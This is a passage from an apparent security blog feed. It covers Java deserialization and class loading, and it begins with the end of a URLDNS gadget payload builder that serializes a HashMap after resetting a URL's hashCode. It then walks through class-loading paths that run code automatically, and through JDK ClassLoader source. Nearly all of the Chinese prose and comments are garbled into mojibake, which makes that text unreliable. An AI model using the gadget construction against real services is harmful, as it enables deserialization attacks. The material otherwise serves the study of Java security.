Field hashCode = url.getClass().getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>    hashCode.setAccessible(<span class="hljs-keyword">true</span>);<br>    hashCode.setInt(url,-<span class="hljs-number">1</span>);<br>    oos.writeObject(hashMap);<br><br><span class="hljs-comment">//     ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\Users\\53433\\Desktop\\tools\\ysoserial\\ser.bin&quot;));</span><br><span class="hljs-comment">//     ois.readObject();</span><br>    &#125;<br><br>    <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SilentURLStreamHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">URLStreamHandler</span> </span>&#123;<br><br>        <span class="hljs-function"><span class="hljs-keyword">protected</span> URLConnection <span class="hljs-title">openConnection</span><span class="hljs-params">(URL u)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title">getHostAddress</span><span class="hljs-params">(URL u)</span> </span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="æ–¹å¼ä¸‰"><a href="#æ–¹å¼ä¸‰" class="headerlink" title="æ–¹å¼ä¸‰"></a>æ–¹å¼ä¸‰</h4><p><strong>å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»åˆè°ƒç”¨å…¶ä»–æœ‰å±é™©æ–¹æ³•çš„ç±»</strong>ï¼Œ<code>readObject()</code>æ—¶è°ƒç”¨<br>è§<a href="https://mechoy.github.io/2022/11/26/CommonsCollections1/">CC1</a></p><h4 id="æ–¹å¼å››"><a href="#æ–¹å¼å››" class="headerlink" title="æ–¹å¼å››"></a>æ–¹å¼å››</h4><p><strong>æ„é€ å‡½æ•°/é™æ€ä»£ç å—ç­‰ç±»åŠ è½½æ—¶éšå¼æ‰§è¡Œ</strong><br><img src="/2022/09/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png"><br>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼šç±»åœ¨åŠ è½½å’Œç±»åˆå§‹åŒ–çš„æ—¶å€™ï¼Œæ¥ä¸ªæµ‹è¯•ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cat</span> </span>&#123;<br>  <span class="hljs-comment">// é™æ€ä»£ç å—</span><br>  <span class="hljs-keyword">static</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;é™æ€ä»£ç å—æ‰§è¡Œ...&quot;</span>);<br>  &#125;<br><br>  &#123;<br>    System.out.println(<span class="hljs-string">&quot;æ„é€ ä»£ç å—æ‰§è¡Œ...&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Integer age = guessAge();<br><br>  <span class="hljs-keyword">public</span> Integer weight = guessWeight();<br><br>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Integer <span class="hljs-title">guessAge</span><span class="hljs-params">()</span></span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;é™æ€å±æ€§åŠ è½½...&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>+<span class="hljs-number">1</span>;<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">public</span> Integer <span class="hljs-title">guessWeight</span><span class="hljs-params">()</span></span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;éé™æ€å±æ€§åŠ è½½...&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">12</span>+<span class="hljs-number">12</span>;<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Cat</span><span class="hljs-params">()</span> </span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;æ— å‚æ„é€ å™¨...&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Cat</span><span class="hljs-params">(Integer weight)</span> </span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;æœ‰å‚æ„é€ å™¨&quot;</span>);<br>    <span class="hljs-keyword">this</span>.weight = weight;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="ç±»åŠ è½½"><a href="#ç±»åŠ è½½" class="headerlink" title="ç±»åŠ è½½"></a>ç±»åŠ è½½</h5><p>ç±»åŠ è½½çš„è¿‡ç¨‹ä¸­æœ‰ä¸¤å—ä¼šè‡ªåŠ¨æ‰§è¡Œä»£ç ï¼š<br>åˆå§‹åŒ–ï¼šé™æ€ä»£ç å—å’Œé™æ€å±æ€§æ‰§è¡Œ<br>å®ä¾‹åŒ–ï¼šé™æ€ä»£ç å—ã€é™æ€å±æ€§ã€ä»£ç å—ã€æ„é€ å™¨æ‰§è¡Œ</p><h6 id="Class-forName"><a href="#Class-forName" class="headerlink" title="Class.forName()"></a>Class.forName()</h6><p><img src="/2022/09/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.png"><br>é™æ€ä»£ç å—å’Œé™æ€å±æ€§åŠ è½½æ‰§è¡Œ<br>è¯•æƒ³ä¸€ä¸‹ï¼Œå¦‚æœåœ¨é™æ€ä»£ç å—ä¸­æœ‰ä¸€æ®µå±é™©ä»£ç ï¼Œåœ¨<code>Class.forName()</code>æ—¶å°±ä¼šè¢«æ‰§è¡Œ</p><h6 id="ClassLoader-loadClass"><a href="#ClassLoader-loadClass" class="headerlink" title="ClassLoader.loadClass()"></a>ClassLoader.loadClass()</h6><p><img src="/2022/09/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.png"><br>å•¥éƒ½æ²¡æ‰§è¡Œï¼Œæ­¤æ—¶åªæ˜¯å°†ç±»åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œéœ€è¦è¿›è¡Œåˆå§‹åŒ–æˆ–å®ä¾‹åŒ–æ‰ä¼šæ‰§è¡Œç±»ä¸­çš„ç›¸å…³ä»£ç </p><h6 id="new"><a href="#new" class="headerlink" title="new"></a>new</h6><p><img src="/2022/09/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.png"><br>å•¥éƒ½æ‰§è¡Œäº†ï¼ŒåŒä¸Šï¼Œå½“æœ‰ä¸€äº›å±é™©ä»£ç åœ¨è¢«è‡ªåŠ¨åŠ è½½çš„åœ°æ–¹ï¼Œé‚£ä¹ˆå°±å¯„</p><h6 id="URLClassLoader-loadClass"><a href="#URLClassLoader-loadClass" class="headerlink" title="URLClassLoader#loadClass"></a>URLClassLoader#loadClass</h6><p>URLClassLoaderï¼Œä¸€ä¸ªæä¾›äº†èƒ½ä»è¿œç¨‹åŠ è½½classæ–‡ä»¶çš„ç±»ï¼Œè¿œç¨‹ã€åŠ è½½ï¼Œä¸€çœ‹å°±å¾ˆå±é™©<br>ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼šURLClassLoader#loadClass()ï¼Œé»˜è®¤å¹¶ä¸ä¼šå¯¹ç±»è¿›è¡Œåˆå§‹åŒ–ï¼Œéœ€è¦newInstance()<br><img src="/2022/09/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.png"><br>è¿˜æœ‰ä¸€äº›å…¶ä»–çš„åè®®ï¼Œä¾‹å¦‚http\https\jarç­‰ï¼Œè§ç±»åŠ è½½ç¯‡</p><h6 id="ClassLoader-defineClass"><a href="#ClassLoader-defineClass" class="headerlink" title="ClassLoader#defineClass"></a>ClassLoader#defineClass</h6><p>è¿™ä¸ªå‘¢ï¼Œç®—æ˜¯ç±»åŠ è½½çš„æœ€åä¸€æ­¥äº†ï¼Œå½“æœ‰ä¸€ä¸ªç±»çš„å­—èŠ‚æ•°ç»„ä¼ å…¥çš„æ—¶å€™ï¼Œè¯¥æ–¹æ³•ä¹Ÿæ˜¯å¯¹ç±»è¿›è¡ŒåŠ è½½çš„ï¼ˆä¸ä¼šåˆå§‹åŒ–ï¼‰<br><img src="/2022/09/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/14.png"></p><h3 id="0x03-æ€»ç»“"><a href="#0x03-æ€»ç»“" class="headerlink" title="0x03 æ€»ç»“"></a>0x03 æ€»ç»“</h3><p>å…¶å®éœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼Œå°±æ˜¯ä¸€äº›ä»£ç è‡ªåŠ¨æ‰§è¡Œçš„åœ°æ–¹ï¼Œä¾‹å¦‚å½“é‡å†™äº†<code>readObject()</code>ï¼Œå°†è‡ªåŠ¨æ‰§è¡Œé‡å†™åçš„<code>readObject</code>ã€ä»£ç å—çš„è‡ªåŠ¨æ‰§è¡ŒåŠ è½½ã€åŠ¨æ€ä»£ç†ç±»çš„<code>invoke()</code>ç­‰ï¼Œå¤šæ³¨æ„ä¸‹è‡ªåŠ¨æ‰§è¡Œä»£ç çš„åœ°æ–¹</p><h4 id="0x04-å‚è€ƒé“¾æ¥"><a href="#0x04-å‚è€ƒé“¾æ¥" class="headerlink" title="0x04 å‚è€ƒé“¾æ¥"></a>0x04 å‚è€ƒé“¾æ¥</h4><ul><li><a href="https://wx.zsxq.com/dweb2/index/topic_detail/548242484442524">Javaå®‰å…¨æ¼«è°ˆ - 08.è®¤è¯†æœ€ç®€å•çš„Gadgetâ€”â€”URLDNS</a></li><li><a href="https://www.bilibili.com/video/BV16h411z7o9/">Javaååºåˆ—åŒ–æ¼æ´ä¸“é¢˜-åŸºç¡€ç¯‡</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Javaå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaç±»åŠ è½½</title>
    <link href="/2022/09/10/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/"/>
    <url>/2022/09/10/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/</url>
    
    <content type="html"><![CDATA[<h2 id="Javaç±»åŠ è½½"><a href="#Javaç±»åŠ è½½" class="headerlink" title="Javaç±»åŠ è½½"></a>Javaç±»åŠ è½½</h2><h3 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h3><p>ä½œä¸ºä¸€ä¸ªå…¨æ˜¯ç±»çš„è¯­è¨€ï¼Œæ€ä¹ˆèƒ½ä¸çœ‹çœ‹ç±»åŠ è½½å‘¢ï¼Œå‰é¢å†åå°„ä¸­å·²ç»å­¦ä¹ äº†ä¸€ç‚¹ç±»åŠ è½½ï¼Œä½†è¿˜è¿œè¿œä¸å¤Ÿï¼Œæ•…åœ¨æ­¤æ›´åŠ æ·±å…¥çš„å­¦ä¹ ä¸€ä¸‹ï¼ŒåŒæ ·ä¹Ÿæ˜¯ä¸ºäº†æ¡åƒåœ¾åšåšé“ºå«ğŸ¥´</p><p>æœ¬æ–‡ç« ä¸­javaç‰ˆæœ¬ä¸ºï¼š<code>jdk1.8.0_341</code></p><h3 id="0x01ç±»çš„ç”Ÿå‘½å‘¨æœŸ"><a href="#0x01ç±»çš„ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="0x01ç±»çš„ç”Ÿå‘½å‘¨æœŸ"></a>0x01ç±»çš„ç”Ÿå‘½å‘¨æœŸ</h3><p><img src="/2022/09/10/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/4.png"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼šé™æ€å˜é‡å’Œé™æ€ä»£ç çš„å—çš„æ‰§è¡Œé¡ºåºæ˜¯æ ¹æ®<strong>ä»£ç å®šä¹‰çš„å…ˆå</strong>ï¼Œå…ˆå†™å“ªä¸ªå°±å…ˆæ‰§è¡Œå“ªä¸ª</p><h3 id="0x02-åŒäº²å§”æ´¾"><a href="#0x02-åŒäº²å§”æ´¾" class="headerlink" title="0x02 åŒäº²å§”æ´¾"></a>0x02 åŒäº²å§”æ´¾</h3><p>åŒäº²å§”æ´¾æœºåˆ¶æ˜¯Javaç±»åŠ è½½å™¨çš„ä¸€ç§é‡è¦å®ç°æ–¹å¼ï¼ŒåŒäº²å§”æ´¾æ˜¯æŒ‡Javaç±»åŠ è½½å™¨åœ¨åŠ è½½ç±»æ—¶ï¼Œå…ˆå°†åŠ è½½ä»»åŠ¡å§”æ‰˜ç»™çˆ¶ç±»åŠ è½½å™¨å»å°è¯•åŠ è½½ï¼Œåªæœ‰å½“çˆ¶ç±»åŠ è½½å™¨æ— æ³•å®ŒæˆåŠ è½½ä»»åŠ¡æ—¶ï¼Œæ‰ç”±å­ç±»åŠ è½½å™¨å»å°è¯•åŠ è½½ã€‚</p><h3 id="0x03-ç±»åŠ è½½å™¨"><a href="#0x03-ç±»åŠ è½½å™¨" class="headerlink" title="0x03 ç±»åŠ è½½å™¨"></a>0x03 ç±»åŠ è½½å™¨</h3><p><img src="/2022/09/10/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/3.png"></p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯<code>sun.misc.Launcher</code> æ˜¯ JDK ä¸­çš„ä¸€ä¸ªéå…¬å¼€ç±»ï¼Œå…¶ä¸»è¦ä½œç”¨æ˜¯å®ç°ç±»çš„åŠ è½½å’Œå¯åŠ¨ã€‚åœ¨JDK9ä¸­å·²ç»å°†è¯¥ç±»ç§»é™¤äº†</p><p><code>Object</code>çš„ç±»åŠ è½½å™¨æ˜¯<code>Bootstrap ClassLoader</code>ï¼Œåº•å±‚çš„ä¸œè¥¿ï¼Œæ­¤å¤„è·å–ä¸äº†ï¼Œæ•…è¿”å›null</p><p><code>EventID</code>æ˜¯æ‰©å±•åŒ…ä¸­çš„ä¸€ä¸ªç±»ï¼ŒåŠ è½½æ‰©å±•åŒ…ä¸­çš„ç±»ä½¿ç”¨<code>ExtClassLoader</code></p><p><code>Cat</code>æ˜¯è‡ªå®šä¹‰çš„ç±»ï¼Œç±»åŠ è½½å™¨ä¸º<code>AppClassLoader</code></p><h4 id="å¯åŠ¨ç±»åŠ è½½å™¨"><a href="#å¯åŠ¨ç±»åŠ è½½å™¨" class="headerlink" title="å¯åŠ¨ç±»åŠ è½½å™¨"></a>å¯åŠ¨ç±»åŠ è½½å™¨</h4><p><code>Bootstrap ClassLoader</code>ï¼Œè¯¥ç±»åŠ è½½å™¨æ˜¯JVMè‡ªèº«çš„ä¸€éƒ¨åˆ†ï¼Œä¸»è¦è´Ÿè´£åŠ è½½Javaçš„æ ¸å¿ƒç±»åº“ï¼Œå¦‚<code>java.lang.*</code>ç­‰ã€‚</p><p>æ ¸å¿ƒç±»åº“çš„æ‰€æœ‰ç±»æ–‡ä»¶éƒ½å­˜å‚¨åœ¨<code>jre/lib/rt.jar</code>ä¸­(JDKçš„å®‰è£…ç›®å½•ä¸‹)ï¼Œæˆ–è€…ä»<code>\Java\jdk1.8.0_341\src\java\</code>è¯¥ç›®å½•ä¸‹è¿›è¡ŒæŸ¥çœ‹ï¼ˆä¸è¿‡è¿™é‡Œç¼ºå°‘äº†ç‚¹æºç ï¼Œä¾‹å¦‚ï¼šsunåŒ…å†…çš„ï¼‰</p><p><img src="/2022/09/10/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/1.png"></p><p><img src="/2022/09/10/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/2.png"></p><h4 id="æ‰©å±•ç±»åŠ è½½å™¨"><a href="#æ‰©å±•ç±»åŠ è½½å™¨" class="headerlink" title="æ‰©å±•ç±»åŠ è½½å™¨"></a>æ‰©å±•ç±»åŠ è½½å™¨</h4><p>æ‰©å±•ç±»åŠ è½½å™¨ï¼ˆExtension Class Loaderï¼‰æ˜¯Javaè™šæ‹Ÿæœºï¼ˆJVMï¼‰å†…ç½®çš„ä¸‰ç§ç±»åŠ è½½å™¨ä¹‹ä¸€ï¼Œå®ƒä¸»è¦ç”¨äºåŠ è½½Javaå¹³å°æ‰©å±•ï¼ˆJava Extensionï¼‰ä»¥åŠä¸€äº›éœ€è¦åœ¨Javaè¿è¡Œæ—¶ç¯å¢ƒä¸­ä½¿ç”¨çš„æ ‡å‡†æ‰©å±•åº“ï¼ˆå¦‚JDBCã€JNDIç­‰ï¼‰ã€‚æ‰©å±•ç±»åŠ è½½å™¨ä½äºç³»ç»Ÿç±»åŠ è½½å™¨ï¼ˆSystem Class Loaderï¼‰ä¹‹å‰ï¼Œä½†æ˜¯åœ¨å¯åŠ¨ç±»åŠ è½½å™¨ï¼ˆBootstrap Class Loaderï¼‰ä¹‹åã€‚</p><h4 id="ç³»ç»Ÿç±»åŠ è½½å™¨"><a href="#ç³»ç»Ÿç±»åŠ è½½å™¨" class="headerlink" title="ç³»ç»Ÿç±»åŠ è½½å™¨"></a>ç³»ç»Ÿç±»åŠ è½½å™¨</h4><p>åŠ è½½åº”ç”¨ç¨‹åº<code>classpath</code>è·¯å¾„ä¸‹çš„ç±»ï¼Œå³æˆ‘ä»¬è‡ªå·±ç¼–å†™çš„Javaç±»ã€‚</p><h4 id="ç”¨æˆ·è‡ªå®šä¹‰ç±»åŠ è½½å™¨"><a href="#ç”¨æˆ·è‡ªå®šä¹‰ç±»åŠ è½½å™¨" class="headerlink" title="ç”¨æˆ·è‡ªå®šä¹‰ç±»åŠ è½½å™¨"></a>ç”¨æˆ·è‡ªå®šä¹‰ç±»åŠ è½½å™¨</h4><p>å®ƒæ˜¯å¯ä»¥ç”±Javaç¨‹åºè‡ªå®šä¹‰å®ç°çš„ç±»åŠ è½½å™¨ï¼Œå¯ä»¥ç”¨äºåŠ è½½ç‰¹å®šçš„ç±»æˆ–èµ„æºï¼Œæˆ–è€…å®ç°ç±»åŠ è½½çš„è‡ªå®šä¹‰è¡Œä¸ºã€‚</p><h3 id="0x04-ç±»åŠ è½½æµç¨‹"><a href="#0x04-ç±»åŠ è½½æµç¨‹" class="headerlink" title="0x04 ç±»åŠ è½½æµç¨‹"></a>0x04 ç±»åŠ è½½æµç¨‹</h3><p>ä»¥<code>Class.forName()</code>ä¸ºä¾‹ï¼Œèµ°ä¸€ä¸‹ç±»åŠ è½½çš„æ•´ä¸ªæµç¨‹ï¼Œç›´æ¥è·Ÿè¿›</p><p><img src="/2022/09/10/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/6.png"></p><p><code>java.lang.Class#forName(java.lang.String)</code>ï¼Œæ¥åˆ°è¿™é‡Œï¼Œæ³¨æ„``</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">forName0(String name, <span class="hljs-keyword">boolean</span> initialize, ClassLoader loader, Class&lt;?&gt; caller)<br><span class="hljs-comment">// boolean initialize: é€‰æ‹©æ˜¯å¦åˆå§‹åŒ–ï¼Œé»˜è®¤ä¸ºtrueï¼Œä¹Ÿå°±æ˜¯é»˜è®¤ä¼šæ‰§è¡Œé™æ€ä»£ç å—å’Œå±æ€§</span><br></code></pre></td></tr></table></figure><p><img src="/2022/09/10/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/7.png"></p><p>è·Ÿè¿›ä¹‹åæ¥åˆ°<code>java.lang.ClassLoader#loadClass(java.lang.String)</code>ï¼Œå¹¶æ²¡æœ‰è¿›å…¥<code>forName0</code>ï¼Œè¿™æ˜¯å› ä¸º<code>forName0</code>æ˜¯ä¸€ä¸ª<code>native</code>ä¿®é¥°çš„æ–¹æ³•</p><p><img src="/2022/09/10/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/8.png"></p><p>è·Ÿè¿›æ¥åˆ°<code>sun.misc.Launcher.AppClassLoader#loadClass(String name, boolean resolve)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Class&lt;?&gt; loadClass(String name, <span class="hljs-keyword">boolean</span> resolve) <span class="hljs-keyword">throws</span> ClassNotFoundException&#123;<br>            <span class="hljs-keyword">int</span> i = name.lastIndexOf(<span class="hljs-string">&#x27;.&#x27;</span>);<span class="hljs-comment">// å®‰å…¨æ£€æŸ¥</span><br>            <span class="hljs-keyword">if</span> (i != -<span class="hljs-number">1</span>) &#123;<br>                SecurityManager sm = System.getSecurityManager();<br>                <span class="hljs-keyword">if</span> (sm != <span class="hljs-keyword">null</span>) &#123;<br>                    sm.checkPackageAccess(name.substring(<span class="hljs-number">0</span>, i));<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (ucp.knownToNotExist(name)) &#123;<span class="hljs-comment">// æ£€æŸ¥</span><br>                <span class="hljs-comment">// The class of the given name is not found in the parent</span><br>                <span class="hljs-comment">// class loader as well as its local URLClassPath.</span><br>                <span class="hljs-comment">// Check if this class has already been defined dynamically;</span><br>                <span class="hljs-comment">// if so, return the loaded class; otherwise, skip the parent</span><br>                <span class="hljs-comment">// delegation and findClass.</span><br>                Class&lt;?&gt; c = findLoadedClass(name);<span class="hljs-comment">// z</span><br>                <span class="hljs-keyword">if</span> (c != <span class="hljs-keyword">null</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (resolve) &#123;<br>                        resolveClass(c);<br>                    &#125;<br>                    <span class="hljs-keyword">return</span> c;<br>                &#125;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ClassNotFoundException(name);<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">super</span>.loadClass(name, resolve));<span class="hljs-comment">// ç»§ç»­</span><br>        &#125;<br></code></pre></td></tr></table></figure><p><code>java.lang.ClassLoader#loadClass(java.lang.String, boolean)</code>ï¼Œæ¥åˆ°äº†åŒäº²å§”æ´¾çš„åœ°æ–¹ï¼Œå…ˆå§”æ‰˜æ‰©å±•ç±»åŠ è½½å™¨è¿›è¡ŒåŠ è½½ï¼Œç„¶åæ‰©å±•ç±»åŠ è½½å™¨å†å§”æ‰˜å¯åŠ¨ç±»åŠ è½½å™¨è¿›è¡ŒåŠ è½½ï¼Œå½“ç„¶æ­¤å¤„ä¸ä¼šè¿›å…¥ç›´æ¥</p><p><img src="/2022/09/10/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/9.png"></p><p>åœ¨è¿™é‡Œèµ°ä¸€åœˆä¹‹åï¼Œæ¥åˆ°</p><p><img src="/2022/09/10/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/10.png"></p><p><code>java.net.URLClassLoader#findClass</code></p><p><img src="/2022/09/10/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/11.png"></p><p><code>java.net.URLClassLoader#defineClass</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Class&lt;?&gt; defineClass(String name, Resource res) <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-keyword">long</span> t0 = System.nanoTime();<span class="hljs-comment">// è·å–è¿è¡Œæ—¶é—´</span><br>    <span class="hljs-keyword">int</span> i = name.lastIndexOf(<span class="hljs-string">&#x27;.&#x27;</span>);<br>    URL url = res.getCodeSourceURL();<span class="hljs-comment">// ç±»çš„classæ–‡ä»¶åœ¨æœ¬åœ°çš„è·¯å¾„ï¼ˆä¸å¸¦åŒ…åï¼‰</span><br>    <span class="hljs-keyword">if</span> (i != -<span class="hljs-number">1</span>) &#123;<br>        String pkgname = name.substring(<span class="hljs-number">0</span>, i);<span class="hljs-comment">// åŒ…å</span><br>        <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦åŠ è½½æŒ‡å®šçš„åŒ…</span><br>        Manifest man = res.getManifest();<span class="hljs-comment">// åŒ…åã€classæ–‡ä»¶ã€æœ¬åœ°è·¯å¾„ä¸‰å’Œä¸€</span><br>        definePackageInternal(pkgname, man, url);<span class="hljs-comment">// å®šä¹‰åŒ…ä»€ä¹ˆçš„ï¼Œä¸å¤ªæ¸…æ¥š</span><br>    &#125;<br>    <span class="hljs-comment">// ç°åœ¨è¯»å–ç±»å­—èŠ‚å¹¶å®šä¹‰ç±»</span><br>    <span class="hljs-comment">// ä»¥ByteBufferçš„å½¢å¼è¿”å›Resourceæ•°æ®ï¼Œè¿™ç§åŠ è½½çš„æ–¹å¼bbå‡ ä¹éƒ½ä¸ºnull</span><br>    java.nio.ByteBuffer bb = res.getByteBuffer();<br>    <span class="hljs-keyword">if</span> (bb != <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-comment">// Use (direct) ByteBuffer:</span><br>        CodeSigner[] signers = res.getCodeSigners();<br>        CodeSource cs = <span class="hljs-keyword">new</span> CodeSource(url, signers);<br>        sun.misc.PerfCounter.getReadClassBytesTime().addElapsedTimeFrom(t0);<br>        <span class="hljs-keyword">return</span> defineClass(name, bb, cs);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">byte</span>[] b = res.getBytes();<span class="hljs-comment">// è¯»å–å­—èŠ‚æµï¼Œä¹Ÿå°±æ˜¯classæ–‡ä»¶çš„å­—èŠ‚æµ</span><br>        <span class="hljs-comment">// must read certificates AFTER reading bytes.</span><br>        CodeSigner[] signers = res.getCodeSigners();<span class="hljs-comment">// è¿”å›èµ„æºçš„ä»£ç ç­¾åè€…ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™è¿”å›nullã€‚</span><br>        <span class="hljs-comment">// CodeSource è¯¥ç±»æ‰©å±•äº†ä»£ç åº“çš„æ¦‚å¿µï¼Œä¸ä»…å°è£…äº†ä½ç½®ï¼ˆURLï¼‰ï¼Œè¿˜å°è£…äº†ç”¨äºéªŒè¯æºè‡ªè¯¥ä½ç½®çš„ç­¾åä»£ç çš„è¯ä¹¦é“¾ã€‚ </span><br>        CodeSource cs = <span class="hljs-keyword">new</span> CodeSource(url, signers);<br>        sun.misc.PerfCounter.getReadClassBytesTime().addElapsedTimeFrom(t0);<br>        <span class="hljs-keyword">return</span> defineClass(name, b, <span class="hljs-number">0</span>, b.length, cs);<span class="hljs-comment">// è·Ÿè¿›è¯¥æ–¹æ³•</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>java.security.SecureClassLoader#defineClass(java.lang.String, byte[], int, int, java.security.CodeSource)</code></p><p><img src="/2022/09/10/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/12.png"></p><p><code>java.lang.ClassLoader#defineClass(java.lang.String, byte[], int, int, java.security.ProtectionDomain)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="hljs-keyword">byte</span>[] b, <span class="hljs-keyword">int</span> off, <span class="hljs-keyword">int</span> len,<br>                  ProtectionDomain protectionDomain) <span class="hljs-keyword">throws</span> ClassFormatError<br>&#123;<br>    protectionDomain = preDefineClass(name, protectionDomain);<span class="hljs-comment">// ä¿æŠ¤åŸŸ</span><br>    String source = defineClassSourceLocation(protectionDomain);<br>    Class&lt;?&gt; c = defineClass1(name, b, off, len, protectionDomain, source);<span class="hljs-comment">// è·Ÿè¿›</span><br>    postDefineClass(c, protectionDomain);<br>    <span class="hljs-keyword">return</span> 